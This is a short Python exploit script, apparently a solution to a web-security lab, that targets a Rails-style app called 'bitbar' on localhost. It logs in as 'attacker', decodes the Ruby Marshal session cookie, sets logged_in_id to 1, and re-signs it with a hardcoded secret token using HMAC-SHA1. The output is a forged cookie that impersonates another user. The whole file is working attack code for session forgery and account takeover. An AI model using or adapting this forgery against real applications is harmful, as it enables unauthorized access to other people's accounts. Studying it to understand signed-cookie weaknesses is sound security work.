# python 生成 cookie

from typing import Dict
import base64

import requests

SECRET_TOKEN = b"0a5bfbbb62856b9781baa6160ecfd00b359d3ee3752384c2f47ceb45eada62f24ee1cbb6e7b0ae3095f70b0a302a2d2ba9aadf7bc686a49c8bac27464f9acb08"


def decode_cookie(cookie: str) -> Dict:
    from rubymarshal.reader import loads

    return loads(base64.b64decode(cookie))


def encode_cookie(cookie: Dict) -> bytes:
    from rubymarshal.writer import writes

    return base64.b64encode(writes(cookie))

def sign_and_decode(cookie: str) -> str:
    import hmac
    from hashlib import sha1
    
    return hmac.new(SECRET_TOKEN, cookie, sha1).hexdigest()


if __name__ == "__main__":
    req = requests.post(
        url="http://127.0.0.1:3000/post_login",
        data={
            "username": "attacker",
            "password": "attacker"
        }
    )
    cookie, _ = req.cookies.get_dict()["_bitbar_session"].split("--")
    cookie = decode_cookie(cookie)
    
    cookie["logged_in_id"] = 1
    cookie = encode_cookie(cookie)
    user1_sig = sign_and_decode(cookie)
    
    print(f"_bitbar_session={cookie.decode()}--{user1_sig}")